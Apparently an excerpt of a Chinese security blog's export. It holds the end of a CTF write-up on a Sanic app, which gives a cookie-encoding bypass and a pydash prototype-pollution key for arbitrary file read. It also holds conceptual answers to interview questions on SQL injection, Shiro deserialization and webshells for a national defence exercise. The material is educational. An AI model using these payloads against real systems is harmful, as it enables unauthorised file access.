class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一个问题比较好解决，翻阅github中sanic的源码可以发现，在处理cookie部分，<strong>sanic会将cookie中的八进制进行解码</strong>，根据这一特性，将cookie赋值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=adm\073n</span><br></pre></td></tr></table></figure><p>即可</p><p>下一个问题是python原型链污染的问题，这里准确的说是一个pydash的原型链污染问题。源代码中的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>存在原型链污染的风险。这里直接对key传入__class__.__init__.__globals__.__file__就可以操控代码中的file变量实现任意文件读取。</p><p>但是在源代码中过滤了._，这里需要做一下绕过。跟进一下相应版本的pydash源码，会发现可以通过\\.来当作.使用，这样就可以做到任意文件读取。</p><p>至此的难度都还在笔者的预料之内，但是由于不知道flag文件名称，还要通过挖掘pydash源码中的链子来进行列目录。这里直接放一个gxn师傅的博客，就不再详细写了，太难了qaq</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>国护面试经验分享</title>
      <link href="/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="国护面试经历"><a href="#国护面试经历" class="headerlink" title="国护面试经历"></a>国护面试经历</h1><p>笔者在2024年的国护中找了一家中间商做面试，虽然得到了蓝初，但是由于去年国护一些众所周知的原因，以及今年国护形式的变动，没有能成功参加今年的国护，比较可惜，现在国护已经结束，总结一下面试题目。</p><h3 id="问：打过内网吗，什么思路"><a href="#问：打过内网吗，什么思路" class="headerlink" title="问：打过内网吗，什么思路"></a>问：打过内网吗，什么思路</h3><p>真没打进去过，只在比赛里用过fscan😭。这个以后能有生产环境的shell再学吧</p><h3 id="问：sql注入分哪几类"><a href="#问：sql注入分哪几类" class="headerlink" title="问：sql注入分哪几类"></a>问：sql注入分哪几类</h3><p>四大基本注入类型分别为：联合注入、盲注、堆叠注入、报错注入。<br>联合注入：通过union语句进行注入<br>盲注：通过延时或返回布尔值进行注入<br>堆叠注入：通过语言特性一次性执行多条sql语句进行注入<br>报错注入：通过恶意语句使报错内容含有一定信息进行注入。</p><h3 id="问：sql注入的二次注入原理和修理手法"><a href="#问：sql注入的二次注入原理和修理手法" class="headerlink" title="问：sql注入的二次注入原理和修理手法"></a>问：sql注入的二次注入原理和修理手法</h3><p>二次注入指的是，web应用现将恶意语句存入了数据库，在后面的某些步骤中，又将这条语句取出，导致了一些安全隐患。比如在更改密码出任意密码重置的问题。</p><p>想要修复二次注入，就需要对来自用户或者来自存储的输入都做转义过滤。</p><h3 id="问：sql报错注入主要用到的函数"><a href="#问：sql报错注入主要用到的函数" class="headerlink" title="问：sql报错注入主要用到的函数"></a>问：sql报错注入主要用到的函数</h3><p>updatexml，extractvalue和floor</p><h3 id="问：内网发现一台主机在大量攻击其他主机的445端口，如何鉴别其攻击类型"><a href="#问：内网发现一台主机在大量攻击其他主机的445端口，如何鉴别其攻击类型" class="headerlink" title="问：内网发现一台主机在大量攻击其他主机的445端口，如何鉴别其攻击类型"></a>问：内网发现一台主机在大量攻击其他主机的445端口，如何鉴别其攻击类型</h3><p>这里不太确定，445端口首先可以利用永恒之蓝，其次上网查了一下，445端口好像主要是win系统的smb服务，可能会有爆破连接尝试远程访问。</p><h3 id="问：主流shell管理工具流量特征"><a href="#问：主流shell管理工具流量特征" class="headerlink" title="问：主流shell管理工具流量特征"></a>问：主流shell管理工具流量特征</h3><p>网上相关的博客很多，不再赘述了</p><h3 id="问：态势感知设备报错，如何判断其是否为误报"><a href="#问：态势感知设备报错，如何判断其是否为误报" class="headerlink" title="问：态势感知设备报错，如何判断其是否为误报"></a>问：态势感知设备报错，如何判断其是否为误报</h3><h3 id="问：文件上传绕过手法"><a href="#问：文件上传绕过手法" class="headerlink" title="问：文件上传绕过手法"></a>问：文件上传绕过手法</h3><p>主要分黑白名单两种情况，各有各的绕过手法，网上也很多</p><h3 id="问：shiro反序列化"><a href="#问：shiro反序列化" class="headerlink" title="问：shiro反序列化"></a>问：shiro反序列化</h3><p>shiro指的是apache shiro框架，框架中的RememberMe功能会把登陆成功的用户经过加密的cookie存储在服务器端，并且在解密之后进行反序列化，这就可能导致rce。加解密过程中涉及了aes，因此构造payload需要知道aes的密钥。</p><h3 id="问：内存马查杀"><a href="#问：内存马查杀" class="headerlink" title="问：内存马查杀"></a>问：内存马查杀</h3><p><a href="https://blog.csdn.net/SimoSimoSimo/article/details/127700190">https://blog.csdn.net/SimoSimoSimo/article/details/127700190</a><br>不太懂，感觉这篇讲的不错</p><h3 id="问：原型链污染"><a href="#问：原型链污染" class="headerlink" title="问：原型链污染"></a>问：原型链污染</h3><p>见主页JS原型链污染</p><h3 id="问：绕没绕过360，有什么思路"><a href="#问：绕没绕过360，有什么思路" class="headerlink" title="问：绕没绕过360，有什么思路"></a>问：绕没绕过360，有什么思路</h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
